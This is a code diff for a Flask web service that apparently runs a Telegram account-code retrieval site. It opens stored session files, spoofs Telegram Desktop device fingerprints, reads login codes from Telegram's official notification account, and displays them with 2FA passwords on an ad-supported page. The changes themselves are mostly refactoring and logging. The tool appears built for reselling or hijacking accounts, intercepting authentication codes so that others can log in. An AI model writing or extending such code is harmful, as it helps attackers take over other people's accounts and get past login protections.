@@ -1,13 +1,13 @@
 import os
 import json
 import asyncio
-from flask import Flask, request
+from flask import Flask, request, send_from_directory
 import logging
 from dotenv import load_dotenv
 import re
 import time
 import random
-
+from datetime import datetime
 from opentele.tl import TelegramClient
 from telethon import events
 from opentele.api import API
@@ -162,51 +162,37 @@ def get_code():
 
     session_path = f"acd/{sid}.session"
     if not os.path.exists(session_path):
-        return render_with_ads('unavailable.html', error='Session不存在'), 404
+        logger.warning(f"访问请求失败: Session文件 {sid}.session 不存在")
+        return render_with_ads('unavailable.html', error='Session不存在或已失效'), 404
 
     twofa = get_twofa_from_api(sid)
-    code = fetch_code_sync(sid, session_path)
+    
+    code, msg_time = fetch_code_sync(sid, session_path)
 
-    if code:
-        return render_with_ads('suc.html', code=code, twofa=twofa)
-
-    return render_with_ads('unavailable.html', error='未获取到验证码'), 404
+    if code and msg_time:
+        return render_with_ads(
+            'suc.html', 
+            code=code, 
+            twofa=twofa, 
+            time=msg_time
+        )
+    
+    logger.info(f"ID {sid} 获取验证码失败或超时")
+    return render_with_ads('unavailable.html', error='暂未接收到最新验证码，请稍后重试'), 404
 
 def fetch_code_sync(sid, session_path):
     async def _fetch():
         config = get_session_config(sid)
-        app_id = config.get('app_id')
-        if app_id is None:
-            app_id = API_ID
-        else:
-            try:
-                app_id = int(app_id)
-            except (ValueError, TypeError):
-                app_id = API_ID
-
-        app_hash = config.get('app_hash')
-        if not app_hash:
-            app_hash = API_HASH
-
-        device_model = config.get('device_model') or None
-        app_version = config.get('app_version') or None
-        system_lang_code = config.get('system_lang_code') or None
-        system_vision = config.get('system_vision') or None
-        lang_pack = config.get('lang_pack') or None
-
+        app_id = int(config.get('app_id', API_ID))
+        app_hash = config.get('app_hash', API_HASH)
         official_api = API.TelegramDesktop.Generate()
-        
-        if device_model:
-            official_api.device_model = device_model
-        if app_version:
-            official_api.app_version = app_version
-        if system_lang_code:
-            official_api.system_lang_code = system_lang_code
-        if system_vision:
-            official_api.system_version = system_vision
-        if lang_pack:
-            official_api.lang_pack = lang_pack
-            official_api.lang_code = lang_pack
+        if config.get('device_model'): official_api.device_model = config['device_model']
+        if config.get('app_version'): official_api.app_version = config['app_version']
+        if config.get('system_lang_code'): official_api.system_lang_code = config['system_lang_code']
+        if config.get('system_vision'): official_api.system_version = config['system_vision']
+        if config.get('lang_pack'):
+            official_api.lang_pack = config['lang_pack']
+            official_api.lang_code = config['lang_pack']
         
         official_api.api_id = app_id
         official_api.api_hash = app_hash
@@ -219,10 +205,12 @@ def fetch_code_sync(sid, session_path):
             api=official_api,
             proxy=proxy_dict
         )
+        
         try:
             await client.connect()
             if not await client.is_user_authorized():
-                return None
+                logger.error(f"Session {sid} 未授权或已失效")
+                return None, None
             
             msgs = await client.get_messages(777000, limit=20)
             for msg in msgs:
@@ -230,31 +218,31 @@ def fetch_code_sync(sid, session_path):
                 codes = re.findall(r'\d{5,6}', text)
                 if codes:
                     latest_code = codes[0]
-                    logger.info(f"从历史消息获取最新验证码 {latest_code} for {sid}")
-                    return latest_code
-            
+                    msg_time = msg.date.astimezone().strftime("%Y-%m-%d %H:%M:%S")
+                    logger.info(f"从历史记录提取验证码: {latest_code} (时间: {msg_time})")
+                    return latest_code, msg_time
             future = asyncio.Future()
 
-            @client.on(events.NewMessage)
+            @client.on(events.NewMessage(chats=777000))
             async def handler(event):
-                if event.sender_id == 777000:
-                    text = event.message.message or ''
-                    codes = re.findall(r'\d{5,6}', text)
-                    if codes and not future.done():
-                        logger.info(f"从新消息获取验证码 {codes[0]} for {sid}")
-                        future.set_result(codes[0])
-                        await client.disconnect()
+                text = event.message.message or ''
+                codes = re.findall(r'\d{5,6}', text)
+                if codes and not future.done():
+                    new_code = codes[0]
+                    new_time = event.message.date.astimezone().strftime("%Y-%m-%d %H:%M:%S")
+                    logger.info(f"收到实时验证码: {new_code} (时间: {new_time})")
+                    future.set_result((new_code, new_time))
 
             try:
                 result = await asyncio.wait_for(future, timeout=30)
                 return result
             except asyncio.TimeoutError:
-                logger.info(f"获取验证码超时 {sid}")
-                return None
+                logger.warning(f"获取验证码超时 {sid}")
+                return None, None
 
         except Exception as e:
-            logger.error(f"获取验证码失败 {sid}: {e}")
-            return None
+            logger.error(f"fetch_code_sync 运行异常 {sid}: {str(e)}")
+            return None, None
         finally:
             await client.disconnect()
 
@@ -264,6 +252,15 @@ def fetch_code_sync(sid, session_path):
         return loop.run_until_complete(_fetch())
     finally:
         loop.close()
+        
+        
+@app.route('/copy.svg')
+def get_copy_svg():
+    return send_from_directory(os.path.dirname(__file__), 'copy.svg')
 
+@app.route('/logo.svg')
+def get_logo_svg():
+    return send_from_directory(os.path.dirname(__file__), 'logo.svg')
+    
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=API_PORT, debug=False)
